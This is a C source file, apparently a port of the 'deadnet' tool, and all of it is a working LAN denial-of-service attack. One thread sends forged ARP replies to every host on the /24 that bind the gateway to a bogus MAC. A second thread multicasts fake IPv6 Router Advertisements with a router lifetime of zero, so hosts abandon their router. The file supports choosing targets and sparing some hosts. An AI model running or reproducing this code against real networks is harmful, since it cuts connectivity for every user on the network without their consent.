/*
 * DeadNet, native C port of github.com/flashnuke/deadnet (GPL-3.0).
 *
 * Two independent workers running on a 100-200ms cadence:
 *
 *  IPv4 - send gratuitous ARP replies claiming to be the gateway, mapped to
 *         a bogus MAC. Every host on the /24 gets one, gateway gets one for
 *         every host too, so bidirectional poisoning. Spare list is skipped.
 *
 *  IPv6 - periodically multicast an ICMPv6 Router Advertisement with
 *         router_lifetime=0 to ff02::1, telling every link-local listener
 *         "the router is dead, stop using it."
 *
 * Deadnet is OFF by default. Config gate: g_cfg.deadnet.
 */

#include "deadnet.h"
#include "../core/config.h"
#include "../common/log.h"

#include <arpa/inet.h>
#include <errno.h>
#include <ifaddrs.h>
#include <linux/if_ether.h>
#include <linux/if_packet.h>
#include <net/ethernet.h>
#include <net/if.h>
#include <netinet/icmp6.h>
#include <netinet/in.h>
#include <netinet/ip6.h>
#include <pthread.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <time.h>
#include <unistd.h>

static volatile int g_run = 0;
static pthread_t    g_t4, g_t6;

/* ARP packet layout */
struct arp_pkt {
    struct ether_header eth;
    uint16_t htype;
    uint16_t ptype;
    uint8_t  hlen;
    uint8_t  plen;
    uint16_t opcode;
    uint8_t  sha[6];
    uint8_t  spa[4];
    uint8_t  tha[6];
    uint8_t  tpa[4];
} __attribute__((packed));

static int get_if_info(const char *ifname, int *ifindex, uint8_t mac[6], uint32_t *ipv4) {
    int s = socket(AF_INET, SOCK_DGRAM, 0);
    if (s < 0) return -1;
    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, ifname, IFNAMSIZ-1);

    if (ioctl(s, SIOCGIFINDEX, &ifr) < 0) { close(s); return -1; }
    *ifindex = ifr.ifr_ifindex;

    if (ioctl(s, SIOCGIFHWADDR, &ifr) < 0) { close(s); return -1; }
    memcpy(mac, ifr.ifr_hwaddr.sa_data, 6);

    if (ioctl(s, SIOCGIFADDR, &ifr) == 0) {
        struct sockaddr_in *sin = (struct sockaddr_in *)&ifr.ifr_addr;
        *ipv4 = sin->sin_addr.s_addr;
    } else {
        *ipv4 = 0;
    }
    close(s);
    return 0;
}

static int in_list(uint32_t ip, const char *list) {
    if (!list || !list[0]) return 0;
    char buf[256];
    strncpy(buf, list, sizeof(buf)-1); buf[sizeof(buf)-1] = 0;
    char *tok, *save = NULL;
    for (tok = strtok_r(buf, ",", &save); tok; tok = strtok_r(NULL, ",", &save)) {
        struct in_addr a;
        if (inet_aton(tok, &a) && a.s_addr == ip) return 1;
    }
    return 0;
}

static void *v4_worker(void *arg) {
    (void)arg;
    const char *ifn = "br0";
    /* fall back to eth0 if br0 absent */
    if (access("/sys/class/net/br0", F_OK) != 0) ifn = "eth0";

    int ifi; uint8_t mac[6]; uint32_t our_ip;
    if (get_if_info(ifn, &ifi, mac, &our_ip) < 0) { LOGE("deadnet", "if %s: %s", ifn, strerror(errno)); return NULL; }

    int s = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
    if (s < 0) { LOGE("deadnet", "AF_PACKET: %s", strerror(errno)); return NULL; }

    struct sockaddr_ll sa;
    memset(&sa, 0, sizeof(sa));
    sa.sll_ifindex = ifi;
    sa.sll_halen   = 6;
    sa.sll_family  = AF_PACKET;
    sa.sll_protocol = htons(ETH_P_ARP);

    uint32_t net = our_ip & htonl(0xFFFFFF00u);  /* /24 */
    uint32_t gw = (net & htonl(0xFFFFFF00u)) | htonl(1);  /* .1 best-guess */

    /* bogus MAC we claim to be */
    uint8_t fake_mac[6] = { 0xDE, 0xAD, 0xBE, 0xEF, 0x66, 0x66 };

    LOGI("deadnet", "v4 armed on %s net=%08x", ifn, ntohl(net));

    while (g_run) {
        /* iterate /24 and poison */
        for (int host = 1; host < 255 && g_run; host++) {
            uint32_t victim = (net & htonl(0xFFFFFF00u)) | htonl(host);
            if (victim == our_ip) continue;
            if (in_list(victim, g_cfg.deadnet_spare)) continue;
            if (g_cfg.deadnet_selective &&
                !in_list(victim, g_cfg.deadnet_targets)) continue;

            struct arp_pkt p;
            memset(&p, 0, sizeof(p));
            memset(p.eth.ether_dhost, 0xFF, 6);
            memcpy(p.eth.ether_shost, fake_mac, 6);
            p.eth.ether_type = htons(ETH_P_ARP);
            p.htype  = htons(1);
            p.ptype  = htons(ETH_P_IP);
            p.hlen   = 6;
            p.plen   = 4;
            p.opcode = htons(2); /* reply */
            memcpy(p.sha, fake_mac, 6);
            memcpy(p.spa, &gw, 4);
            memcpy(p.tha, p.eth.ether_dhost, 6);
            memcpy(p.tpa, &victim, 4);

            sendto(s, &p, sizeof(p), 0, (struct sockaddr *)&sa, sizeof(sa));
        }
        usleep((unsigned)g_cfg.deadnet_interval_ms * 1000);
    }
    close(s);
    return NULL;
}

/* IPv6 - fake RA with lifetime=0 */
static uint16_t icmp6_cksum(const struct ip6_hdr *ip6, const void *buf, size_t len) {
    uint32_t sum = 0;
    const uint16_t *w = (const uint16_t *)&ip6->ip6_src;
    for (size_t i = 0; i < 16; i++) sum += w[i];
    sum += htons((uint16_t)len);
    sum += htons(IPPROTO_ICMPV6);
    w = buf;
    size_t n = len;
    while (n > 1) { sum += *w++; n -= 2; }
    if (n) sum += *(const uint8_t *)w;
    while (sum >> 16) sum = (sum & 0xFFFF) + (sum >> 16);
    return (uint16_t)~sum;
}

static void *v6_worker(void *arg) {
    (void)arg;
    const char *ifn = "br0";
    if (access("/sys/class/net/br0", F_OK) != 0) ifn = "eth0";

    int s = socket(AF_INET6, SOCK_RAW, IPPROTO_ICMPV6);
    if (s < 0) { LOGW("deadnet", "v6 AF_INET6: %s", strerror(errno)); return NULL; }
    int hops = 255;
    setsockopt(s, IPPROTO_IPV6, IPV6_UNICAST_HOPS,   &hops, sizeof(hops));
    setsockopt(s, IPPROTO_IPV6, IPV6_MULTICAST_HOPS, &hops, sizeof(hops));

    unsigned ifidx = if_nametoindex(ifn);
    setsockopt(s, IPPROTO_IPV6, IPV6_MULTICAST_IF, &ifidx, sizeof(ifidx));

    struct sockaddr_in6 dst;
    memset(&dst, 0, sizeof(dst));
    dst.sin6_family = AF_INET6;
    inet_pton(AF_INET6, "ff02::1", &dst.sin6_addr);
    dst.sin6_scope_id = ifidx;

    /* RA fields: type=134, code=0, cur_hop_limit=64, flags=0, lifetime=0 */
    uint8_t ra[16] = { 134, 0, 0, 0, 64, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 };
    /* lifetime bytes 6-7 explicitly zero */

    LOGI("deadnet", "v6 armed on %s (idx=%u)", ifn, ifidx);
    while (g_run) {
        sendto(s, ra, sizeof(ra), 0, (struct sockaddr *)&dst, sizeof(dst));
        usleep((unsigned)g_cfg.deadnet_interval_ms * 1000);
    }
    close(s);
    return NULL;
}

int deadnet_start(void) {
    if (!g_cfg.deadnet) { LOGI("deadnet", "disabled"); return 0; }
    g_run = 1;
    if (g_cfg.deadnet_ipv4) pthread_create(&g_t4, NULL, v4_worker, NULL);
    if (g_cfg.deadnet_ipv6) pthread_create(&g_t6, NULL, v6_worker, NULL);
    return 0;
}

int deadnet_stop(void) {
    g_run = 0;
    if (g_cfg.deadnet_ipv4) pthread_join(g_t4, NULL);
    if (g_cfg.deadnet_ipv6) pthread_join(g_t6, NULL);
    return 0;
}
